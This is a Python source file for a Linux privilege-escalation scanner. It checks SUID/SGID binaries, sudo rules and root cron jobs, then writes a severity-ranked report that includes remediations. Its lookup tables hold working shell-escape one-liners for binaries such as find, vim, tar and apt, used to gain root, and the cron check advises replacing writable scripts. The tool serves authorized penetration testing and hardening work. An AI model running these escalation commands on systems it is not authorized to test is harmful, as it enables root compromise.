#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
privesc_check.py - PrivEscChecker: Combined Linux Privilege Escalation Checker
Author: Rajdeep Goswami

Runs three checks against the local system and reports findings in a
single, unified report:
  1. SUID/SGID binaries that are known to be exploitable (GTFOBins-style)
  2. Sudo misconfigurations (NOPASSWD, ALL, wildcard, known-exploitable
     binaries allowed via sudo)
  3. Cron jobs (system-wide, /etc/crontab and /etc/cron.d) that run as
     root and whose script path (or a parent directory) is writable by
     the current user

Findings are tiered CRITICAL / HIGH / INFO, and each actionable finding
includes a suggested exploitation command (for engagement use) and a
suggested remediation (for the write-up / blue-team side).

Written to run on both very old Python 2 (confirmed against Python
2.5.2 on Metasploitable2) and Python 3. Deliberately avoids:
  - str.format()      (missing before Python 2.6)
  - the 'with' statement (missing before Python 2.6)
  - argparse           (missing before Python 2.7)
  - the 'bytes' builtin (missing before Python 2.6 - this one caused a
    real, hard-to-spot bug during development: a broad except clause
    silently swallowed the resulting NameError, making user-context
    detection appear to fail for no visible reason)

USAGE:
    python privesc_check.py
    python privesc_check.py --output report.md

Intended for use on Linux systems you are authorized to test
(e.g. your own lab VMs, CTF machines you have legitimate access to).
This tool assumes you already have a shell / initial foothold on the
target - it does not attempt to gain one.
"""

import os
import sys
import stat
import subprocess
from datetime import datetime

# ---------------------------------------------------------------------------
# Shared utilities
# ---------------------------------------------------------------------------

def run_cmd(cmd_list, stdin_file=None):
    """
    Run a command and return (stdout, stderr, returncode).

    Does NOT use isinstance(out, bytes) anywhere - the 'bytes' builtin
    does not exist at all on Python < 2.6, and checking for it raises a
    NameError that a broad except clause can silently swallow. Instead,
    "not isinstance(out, str)" is used, which is only ever true on
    Python 3 (where subprocess output really is bytes).
    """
    try:
        proc = subprocess.Popen(cmd_list, stdin=stdin_file,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        if not isinstance(out, str):
            out = out.decode("utf-8", "replace")
        if not isinstance(err, str):
            err = err.decode("utf-8", "replace")
        return out, err, proc.returncode
    except Exception:
        return "", "", -1


def run_cmd_with_fallback_paths(cmd_list):
    """
    Like run_cmd, but if the bare command name fails to resolve (seen
    over some minimal SSH/backdoor shell environments where PATH isn't
    inherited the way an interactive login shell would), retries with
    common full paths.
    """
    out, err, rc = run_cmd(cmd_list)
    if rc == 0 and out.strip():
        return out, rc

    fallback_dirs = ["/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/"]
    original_cmd = cmd_list[0]
    for prefix in fallback_dirs:
        full_path = prefix + original_cmd
        out, err, rc = run_cmd([full_path] + cmd_list[1:])
        if out.strip():
            return out, rc

    return "", -1


def get_current_user_context():
    """Grab basic context: current user, id output, for the report header."""
    whoami_out, _ = run_cmd_with_fallback_paths(["whoami"])
    id_out, _ = run_cmd_with_fallback_paths(["id"])
    return whoami_out.strip(), id_out.strip()


def get_current_uid_and_groups():
    """Return (uid, list_of_gids) for the current process."""
    try:
        uid = os.getuid()
    except Exception:
        uid = None
    try:
        gids = os.getgroups()
    except Exception:
        gids = []
    return uid, gids


def read_file_safely(path):
    """Read a file's contents, returning None if it can't be read."""
    try:
        fh = open(path, "r")
        try:
            content = fh.read()
        finally:
            fh.close()
        return content
    except Exception:
        return None


def make_finding(category, title, severity, why_it_matters, exploit_cmd,
                  remediation, evidence):
    """
    Build a single finding dict. This is the shared data model all
    three checks feed into, so the combined report can render every
    finding the same way regardless of which check produced it.

    severity: "CRITICAL", "HIGH", or "INFO"
    exploit_cmd: suggested command to confirm/use the finding, or None
    remediation: suggested fix, or None
    evidence: short string showing how this was detected (e.g. the raw
              permission bits, or the raw sudoers line)
    """
    return {
        "category": category,
        "title": title,
        "severity": severity,
        "why_it_matters": why_it_matters,
        "exploit_cmd": exploit_cmd,
        "remediation": remediation,
        "evidence": evidence,
    }


# ---------------------------------------------------------------------------
# Check 1: SUID / SGID binaries
# ---------------------------------------------------------------------------

SUID_KNOWN_EXPLOITABLE = {
    "find":    ("Can spawn a shell via 'find . -exec /bin/sh \\; -quit' when SUID.",
                "find . -exec /bin/sh \\; -quit"),
    "vim":     ("Can spawn a shell via ':!sh' or read/write arbitrary files when SUID.",
                "vim -c ':!sh'"),
    "vi":      ("Can spawn a shell via ':!sh' when SUID.",
                "vi -c ':!sh'"),
    "nano":    ("Can read/write arbitrary files as owner when SUID.", None),
    "less":    ("Can spawn a shell via '!sh' when SUID.", "less /etc/profile  (then type: !sh)"),
    "more":    ("Can spawn a shell via '!sh' when SUID (older versions).", "more /etc/profile  (then type: !sh)"),
    "nmap":    ("Older versions support --interactive mode, allowing shell execution when SUID.",
                "nmap --interactive  (then: !sh)"),
    "python":  ("Can spawn a shell via os.system when SUID.", "python -c 'import os; os.system(\"/bin/sh\")'"),
    "python3": ("Can spawn a shell via os.system when SUID.", "python3 -c 'import os; os.system(\"/bin/sh\")'"),
    "perl":    ("Can spawn a shell via exec when SUID.", "perl -e 'exec \"/bin/sh\";'"),
    "awk":     ("Can spawn a shell when SUID.", "awk 'BEGIN {system(\"/bin/sh\")}'"),
    "cp":      ("Can overwrite sensitive files (e.g. /etc/passwd) as owner when SUID.", None),
    "tar":     ("Can spawn a shell via checkpoint-action tricks when SUID.",
                "tar --checkpoint=1 --checkpoint-action=exec=/bin/sh"),
    "env":     ("Can spawn a shell directly when SUID.", "env /bin/sh -p"),
    "bash":    ("If SUID, spawns a root shell directly.", "bash -p"),
    "sh":      ("If SUID, spawns a root shell directly.", "sh -p"),
}

SUID_REMEDIATION = "Remove the SUID/SGID bit unless explicitly required: chmod -s <path>"


def find_suid_sgid_files():
    """Walk the filesystem for files with the SUID or SGID bit set."""
    findings = []
    skip_dirs = set(["/proc", "/sys", "/run"])

    for root, dirs, files in os.walk("/", topdown=True):
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in skip_dirs]
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                st = os.lstat(fpath)
            except (OSError, IOError):
                continue
            mode = st.st_mode
            is_suid = bool(mode & stat.S_ISUID)
            is_sgid = bool(mode & stat.S_ISGID)
            if is_suid or is_sgid:
                findings.append({
                    "path": fpath,
                    "suid": is_suid,
                    "sgid": is_sgid,
                    "owner_uid": st.st_uid,
                })
    return findings


def run_suid_check():
    """Run the SUID/SGID check. Returns a list of finding dicts."""
    raw = find_suid_sgid_files()
    results = []

    for f in raw:
        basename = os.path.basename(f["path"])
        bits = []
        if f["suid"]:
            bits.append("SUID")
        if f["sgid"]:
            bits.append("SGID")
        evidence = "%s set on %s (owner UID %s)" % ("/".join(bits), f["path"], f["owner_uid"])

        if basename in SUID_KNOWN_EXPLOITABLE:
            why, exploit = SUID_KNOWN_EXPLOITABLE[basename]
            results.append(make_finding(
                category="SUID/SGID Binary",
                title="%s" % f["path"],
                severity="CRITICAL",
                why_it_matters=why,
                exploit_cmd=exploit,
                remediation=SUID_REMEDIATION,
                evidence=evidence,
            ))
        else:
            results.append(make_finding(
                category="SUID/SGID Binary",
                title="%s" % f["path"],
                severity="INFO",
                why_it_matters="SUID/SGID set, but not a recognized high-risk binary. Manually review if unexpected.",
                exploit_cmd=None,
                remediation=None,
                evidence=evidence,
            ))

    return results


# ---------------------------------------------------------------------------
# Check 2: Sudo misconfiguration
# ---------------------------------------------------------------------------

SUDO_KNOWN_EXPLOITABLE = {
    "find":    ("Can spawn a root shell via sudo.", "sudo find . -exec /bin/sh \\; -quit"),
    "vim":     ("Can spawn a root shell via sudo.", "sudo vim -c ':!sh'"),
    "vi":      ("Can spawn a root shell via sudo.", "sudo vi -c ':!sh'"),
    "nano":    ("Can read/write arbitrary files as root via sudo.", None),
    "less":    ("Can spawn a root shell via sudo.", "sudo less /etc/profile  (then: !sh)"),
    "more":    ("Can spawn a root shell via sudo.", "sudo more /etc/profile  (then: !sh)"),
    "nmap":    ("Older versions support --interactive mode via sudo.", "sudo nmap --interactive  (then: !sh)"),
    "python":  ("Can spawn a root shell via sudo.", "sudo python -c 'import os; os.system(\"/bin/sh\")'"),
    "python3": ("Can spawn a root shell via sudo.", "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"),
    "perl":    ("Can spawn a root shell via sudo.", "sudo perl -e 'exec \"/bin/sh\";'"),
    "awk":     ("Can spawn a root shell via sudo.", "sudo awk 'BEGIN {system(\"/bin/sh\")}'"),
    "cp":      ("Can overwrite root-owned files via sudo.", None),
    "tar":     ("Can spawn a root shell via sudo.", "sudo tar --checkpoint=1 --checkpoint-action=exec=/bin/sh"),
    "env":     ("Can spawn a root shell directly via sudo.", "sudo env /bin/sh"),
    "bash":    ("Direct root shell.", "sudo bash"),
    "sh":      ("Direct root shell.", "sudo sh"),
    "su":      ("Can become root directly.", "sudo su"),
    "apt":     ("Can spawn a root shell via a pre-invoke hook.", "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"),
    "apt-get": ("Can spawn a root shell via a pre-invoke hook.", "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"),
}

SUDO_REMEDIATION = "Remove the sudoers entry, or restrict it to only the specific arguments actually needed."


def get_sudo_l_output():
    """
    Run 'sudo -l' safely, stdin redirected from /dev/null so it can
    never hang on a password prompt. Does NOT use 'sudo -n -l' - the -n
    flag does not exist on older sudo versions (confirmed: rejected
    outright as "illegal option -n" on Metasploitable2's sudo).
    """
    devnull = None
    out, err, rc = "", "", -1
    try:
        devnull = open("/dev/null", "r")
        proc = subprocess.Popen(["sudo", "-l"], stdin=devnull,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        if not isinstance(out, str):
            out = out.decode("utf-8", "replace")
        if not isinstance(err, str):
            err = err.decode("utf-8", "replace")
        rc = proc.returncode
    except Exception:
        pass
    finally:
        if devnull is not None:
            devnull.close()

    could_run = (rc == 0 and out.strip() != "")
    needs_password = (not could_run) and ("password" in err.lower())
    return out, could_run, needs_password


def parse_sudo_entries(raw_output):
    """Parse 'sudo -l' output into a list of {"raw", "nopasswd", "commands"} dicts."""
    entries = []
    for line in raw_output.split("\n"):
        stripped = line.strip()
        if not stripped:
            continue
        if "(" in stripped and ")" in stripped:
            nopasswd = "NOPASSWD" in stripped
            after_paren = stripped.split(")", 1)
            cmd_part = after_paren[1].strip() if len(after_paren) > 1 else stripped
            if cmd_part.upper().startswith("NOPASSWD:"):
                cmd_part = cmd_part[len("NOPASSWD:"):].strip()
            commands = [c.strip() for c in cmd_part.split(",") if c.strip()]
            entries.append({"raw": stripped, "nopasswd": nopasswd, "commands": commands})
    return entries


def run_sudo_check():
    """Run the sudo misconfiguration check. Returns a list of finding dicts."""
    results = []
    raw_output, could_run, needs_password = get_sudo_l_output()

    if not could_run:
        note = "sudo access requires a password (this scanner never attempts an interactive prompt)." \
            if needs_password else "No sudo entry found for this user (or sudo -l could not be read)."
        results.append(make_finding(
            category="Sudo Misconfiguration",
            title="sudo -l could not be read non-interactively",
            severity="INFO",
            why_it_matters=note,
            exploit_cmd="sudo -l  (run manually, supply the password if prompted)",
            remediation=None,
            evidence="sudo -l returned no usable output",
        ))
        return results

    entries = parse_sudo_entries(raw_output)
    for entry in entries:
        for cmd in entry["commands"]:
            evidence = "sudoers entry: %s" % entry["raw"]

            if cmd == "ALL":
                results.append(make_finding(
                    category="Sudo Misconfiguration",
                    title="sudo ALL commands allowed",
                    severity="CRITICAL",
                    why_it_matters="This user can run any command as the target user via sudo - full compromise.",
                    exploit_cmd="sudo su" if entry["nopasswd"] else "sudo su  (password required)",
                    remediation=SUDO_REMEDIATION,
                    evidence=evidence,
                ))
                continue

            cmd_path = cmd.split(" ")[0]
            basename = cmd_path.split("/")[-1]

            if basename in SUDO_KNOWN_EXPLOITABLE:
                why, exploit = SUDO_KNOWN_EXPLOITABLE[basename]
                results.append(make_finding(
                    category="Sudo Misconfiguration",
                    title="sudo: %s" % cmd,
                    severity="CRITICAL",
                    why_it_matters=why,
                    exploit_cmd=exploit,
                    remediation=SUDO_REMEDIATION,
                    evidence=evidence,
                ))
            elif "*" in cmd:
                results.append(make_finding(
                    category="Sudo Misconfiguration",
                    title="sudo: %s" % cmd,
                    severity="HIGH",
                    why_it_matters="Wildcard argument allowed - may permit passing unintended flags or arguments as root.",
                    exploit_cmd=None,
                    remediation=SUDO_REMEDIATION,
                    evidence=evidence,
                ))
            else:
                results.append(make_finding(
                    category="Sudo Misconfiguration",
                    title="sudo: %s" % cmd,
                    severity="INFO",
                    why_it_matters="Allowed via sudo, but not matched against a known high-risk pattern. Manually review.",
                    exploit_cmd=None,
                    remediation=None,
                    evidence=evidence,
                ))

    return results


# ---------------------------------------------------------------------------
# Check 3: Cron job misconfiguration
# ---------------------------------------------------------------------------

CRON_D_DIR = "/etc/cron.d"


def list_cron_d_files():
    """List full paths of files inside /etc/cron.d, if readable."""
    files = []
    try:
        if os.path.isdir(CRON_D_DIR):
            for fname in os.listdir(CRON_D_DIR):
                full_path = os.path.join(CRON_D_DIR, fname)
                if os.path.isfile(full_path):
                    files.append(full_path)
    except Exception:
        pass
    return files


def parse_crontab_line(line):
    """Parse a crontab-style line into (user, command), or None."""
    stripped = line.strip()
    if not stripped or stripped.startswith("#"):
        return None
    if "=" in stripped.split(" ")[0]:
        return None
    parts = stripped.split(None, 6)
    if len(parts) < 7:
        return None
    return parts[5], parts[6]


def extract_script_path(command):
    """
    Extract the actual executed script/binary path from a cron command,
    skipping past shell conditionals/guard clauses (test -e ... || ...,
    [ -x ... ] && ...) so the real command is checked, not a path used
    only in an existence check.

    Deliberately does NOT split on "|" (pipe) - a pipeline's first
    command is usually the operative one (e.g. "find /some/dir | xargs
    rm" - the path we care about is in the find call, not after the
    pipe). Splitting on pipe was tried during development and it
    discarded the real path in exactly this pattern, so only && / || /
    ; are treated as "the real command comes after this" separators.
    """
    segment = command
    for separator in ["||", "&&", ";"]:
        if separator in segment:
            segment = segment.split(separator)[-1]

    tokens = segment.split()
    for token in tokens:
        if token.startswith("/"):
            return token
    return None


def check_path_writable(path, current_uid, current_gids):
    """Check whether path or any parent directory is writable by the current user."""
    writable_findings = []
    parts_to_check = []
    current = path
    while True:
        parts_to_check.append(current)
        parent = os.path.dirname(current)
        if parent == current or parent == "":
            break
        current = parent
        if current == "/":
            parts_to_check.append(current)
            break

    for check_path in parts_to_check:
        try:
            st = os.stat(check_path)
        except Exception:
            continue
        mode = st.st_mode
        world_writable = bool(mode & stat.S_IWOTH)
        group_writable = bool(mode & stat.S_IWGRP)
        owner_writable = bool(mode & stat.S_IWUSR)

        if world_writable:
            writable_findings.append((check_path, "world-writable"))
        elif owner_writable and st.st_uid == current_uid:
            writable_findings.append((check_path, "owned and writable by current user"))
        elif group_writable and st.st_gid in current_gids:
            writable_findings.append((check_path, "group-writable, current user is in that group"))

    return writable_findings


def gather_cron_jobs():
    """Read all system cron job sources. Returns list of {"source","user","command"}."""
    jobs = []
    sources = ["/etc/crontab"] + list_cron_d_files()
    for source in sources:
        content = read_file_safely(source)
        if content is None:
            continue
        for line in content.split("\n"):
            parsed = parse_crontab_line(line)
            if parsed is not None:
                user, command = parsed
                jobs.append({"source": source, "user": user, "command": command})
    return jobs


def run_cron_check(current_uid, current_gids):
    """Run the cron job check. Returns a list of finding dicts."""
    results = []
    could_read = (read_file_safely("/etc/crontab") is not None) or (len(list_cron_d_files()) > 0)

    if not could_read:
        results.append(make_finding(
            category="Cron Job",
            title="/etc/crontab and /etc/cron.d not readable",
            severity="INFO",
            why_it_matters="This user may not have permission to view system cron jobs.",
            exploit_cmd=None,
            remediation=None,
            evidence="read attempt failed",
        ))
        return results

    jobs = gather_cron_jobs()
    for job in jobs:
        script_path = extract_script_path(job["command"])
        evidence = "source: %s | runs as: %s | command: %s" % (job["source"], job["user"], job["command"])

        if script_path is None:
            results.append(make_finding(
                category="Cron Job",
                title=job["command"],
                severity="INFO",
                why_it_matters="Could not identify a specific script path in this command; manual review recommended.",
                exploit_cmd=None,
                remediation=None,
                evidence=evidence,
            ))
            continue

        writable = check_path_writable(script_path, current_uid, current_gids)

        if writable and job["user"] == "root":
            reasons = "; ".join(["%s (%s)" % (p, r) for p, r in writable])
            results.append(make_finding(
                category="Cron Job",
                title=job["command"],
                severity="HIGH",
                why_it_matters="This job runs as root and its script path (or a parent directory) is writable: %s" % reasons,
                exploit_cmd="Modify or replace the writable path with attacker-controlled content, then wait for the cron job to fire.",
                remediation="Restrict permissions on the writable path so only root can write to it.",
                evidence=evidence,
            ))
        elif writable:
            reasons = "; ".join(["%s (%s)" % (p, r) for p, r in writable])
            results.append(make_finding(
                category="Cron Job",
                title=job["command"],
                severity="INFO",
                why_it_matters="Script path is writable, but job does not run as root: %s" % reasons,
                exploit_cmd=None,
                remediation=None,
                evidence=evidence,
            ))
        else:
            results.append(make_finding(
                category="Cron Job",
                title=job["command"],
                severity="INFO",
                why_it_matters="No writable path found for this job's script.",
                exploit_cmd=None,
                remediation=None,
                evidence=evidence,
            ))

    return results


# ---------------------------------------------------------------------------
# Report building
# ---------------------------------------------------------------------------

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "INFO": 2}


def build_report(all_findings, whoami, id_out):
    """Build the unified markdown report, sorted by severity, with a summary table."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    by_category = {}
    for f in all_findings:
        by_category.setdefault(f["category"], {"CRITICAL": 0, "HIGH": 0, "INFO": 0})
        by_category[f["category"]][f["severity"]] += 1

    critical = [f for f in all_findings if f["severity"] == "CRITICAL"]
    high = [f for f in all_findings if f["severity"] == "HIGH"]
    info = [f for f in all_findings if f["severity"] == "INFO"]

    lines = []
    lines.append("# PrivEscChecker - Combined Privilege Escalation Report")
    lines.append("")
    lines.append("**Scan time:** %s" % timestamp)
    lines.append("**Run as:** %s" % whoami)
    lines.append("**id output:** `%s`" % id_out)
    lines.append("")
    lines.append("## Summary")
    lines.append("")
    lines.append("| Category | CRITICAL | HIGH | INFO |")
    lines.append("|---|---|---|---|")
    for category in sorted(by_category.keys()):
        counts = by_category[category]
        lines.append("| %s | %d | %d | %d |" % (
            category, counts["CRITICAL"], counts["HIGH"], counts["INFO"]))
    lines.append("")
    lines.append("**Total: %d CRITICAL, %d HIGH, %d INFO findings.**" % (
        len(critical), len(high), len(info)))
    lines.append("")

    if critical or high:
        lines.append("This system has one or more viable privilege escalation paths. ")
        lines.append("See the CRITICAL and HIGH sections below for details.")
    else:
        lines.append("No CRITICAL or HIGH findings from these checks. This does not ")
        lines.append("guarantee the system is fully hardened - only that these specific ")
        lines.append("checks (SUID/SGID, sudo misconfiguration, cron jobs) found nothing.")
    lines.append("")
    lines.append("---")
    lines.append("")

    def render_finding(f):
        block = []
        block.append("### [%s] %s: %s" % (f["severity"], f["category"], f["title"]))
        block.append("- **Why this matters:** %s" % f["why_it_matters"])
        block.append("- **Evidence:** `%s`" % f["evidence"])
        if f["exploit_cmd"]:
            block.append("- **Suggested exploitation:** `%s`" % f["exploit_cmd"])
        if f["remediation"]:
            block.append("- **Suggested remediation:** %s" % f["remediation"])
        block.append("")
        return block

    if critical:
        lines.append("## CRITICAL Findings (confirmed or near-certain exploit path)")
        lines.append("")
        for f in critical:
            lines.extend(render_finding(f))

    if high:
        lines.append("## HIGH Findings (likely exploitable, verify before use)")
        lines.append("")
        for f in high:
            lines.extend(render_finding(f))

    if info:
        lines.append("## INFO (reviewed, not flagged as high-risk)")
        lines.append("")
        lines.append("| Category | Title | Note |")
        lines.append("|---|---|---|")
        for f in info:
            lines.append("| %s | `%s` | %s |" % (f["category"], f["title"], f["why_it_matters"]))
        lines.append("")

    lines.append("---")
    lines.append("")
    lines.append("**Scope reminder:** Run this only on systems you are authorized to ")
    lines.append("test (your own lab VMs, CTF machines you have legitimate access to). ")
    lines.append("This tool assumes an initial foothold already exists - it does not ")
    lines.append("attempt to gain access on its own.")

    return "\n".join(lines)


def print_console_summary(all_findings):
    """Print a concise console summary (full detail goes in the report file)."""
    critical = [f for f in all_findings if f["severity"] == "CRITICAL"]
    high = [f for f in all_findings if f["severity"] == "HIGH"]
    info = [f for f in all_findings if f["severity"] == "INFO"]

    print("[*] Scan complete. %d total findings." % len(all_findings))
    print("[!!] %d CRITICAL findings." % len(critical))
    print("[!] %d HIGH findings." % len(high))
    print("[i] %d INFO findings." % len(info))
    print("")

    for f in critical + high:
        print("[%s] %s: %s" % (f["severity"], f["category"], f["title"]))
        print("        -> %s" % f["why_it_matters"])
        if f["exploit_cmd"]:
            print("        exploit: %s" % f["exploit_cmd"])
        print("")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args(argv):
    """Minimal manual argument parser (no argparse - see module docstring)."""
    class Args:
        pass

    result = Args()
    result.output = None

    i = 0
    while i < len(argv):
        arg = argv[i]
        if arg == "--output" or arg == "-o":
            if i + 1 < len(argv):
                result.output = argv[i + 1]
                i = i + 2
                continue
            else:
                print("[!] --output requires a path argument")
                sys.exit(1)
        elif arg.startswith("--output="):
            result.output = arg.split("=", 1)[1]
            i = i + 1
            continue
        elif arg == "-h" or arg == "--help":
            print("Usage: python privesc_check.py [--output report.md]")
            sys.exit(0)
        else:
            print("[!] Unrecognized argument: %s" % arg)
            sys.exit(1)
        i = i + 1

    return result


def main():
    args = parse_args(sys.argv[1:])

    print("[*] PrivEscChecker - Combined Privilege Escalation Scan")
    print("[*] Running SUID/SGID, sudo, and cron checks...")
    print("")

    whoami, id_out = get_current_user_context()
    print("[*] Running as: %s" % whoami)
    print("[*] id: %s" % id_out)
    print("")

    current_uid, current_gids = get_current_uid_and_groups()

    all_findings = []
    all_findings.extend(run_suid_check())
    all_findings.extend(run_sudo_check())
    all_findings.extend(run_cron_check(current_uid, current_gids))

    print_console_summary(all_findings)

    if args.output:
        report = build_report(all_findings, whoami, id_out)
        fh = open(args.output, "w")
        try:
            fh.write(report)
        finally:
            fh.close()
        print("[*] Full report saved to: %s" % args.output)


if __name__ == "__main__":
    main()
